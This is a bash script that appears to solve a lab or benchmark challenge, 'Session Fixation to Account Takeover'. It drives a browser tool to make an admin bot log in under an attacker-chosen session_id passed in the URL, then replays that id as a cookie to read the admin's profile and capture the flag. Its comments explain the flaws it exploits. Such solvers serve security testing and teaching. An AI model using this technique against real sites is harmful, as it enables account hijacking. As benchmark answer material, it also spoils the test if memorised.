#!/usr/bin/env bash
# APEX-017-25 — "Session Fixation to Account Takeover" (tags: session, fixation)
#
# Two mistakes that are only fatal together. The session middleware takes the
# session id from `?session_id=` as readily as from the cookie, and logging in
# does not issue a new one. So an id chosen by the attacker, walked into the
# victim's browser by a link, is the id their authenticated session ends up
# under — and the attacker already has it.
#
# The h5i part worth noticing: the fixed id goes in as a cookie on a request
# the session already made (`--set cookie.session_id=…`), so the hijack is one
# resend of an ordinary page load, and the audit shows the same page fetched
# twice with one cookie different.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
HOST="${URL%:*}"
APP="${APP_URL:-$HOST:3017}"
BOT="${BOT_URL:-$HOST:4017}"
SESSION="apex017-$$"
# Any id will do: the application takes what it is given rather than minting one.
FIXED="fixated$(date +%s)$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$BOT/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" "$(last "$SESSION")" --create \
    --set method=POST --set path=/bot/visit \
    --set header.Content-Type=application/json \
    --set "json.url=http://app:4567/login?session_id=$FIXED" >/dev/null

# The admin has now authenticated under an id that was never theirs.
"$H5I" browser navigate "$APP/" --session "$SESSION" >/dev/null
send "$SESSION" "$(last "$SESSION")" --create \
    --set path=/profile --set "cookie.session_id=$FIXED" | flag
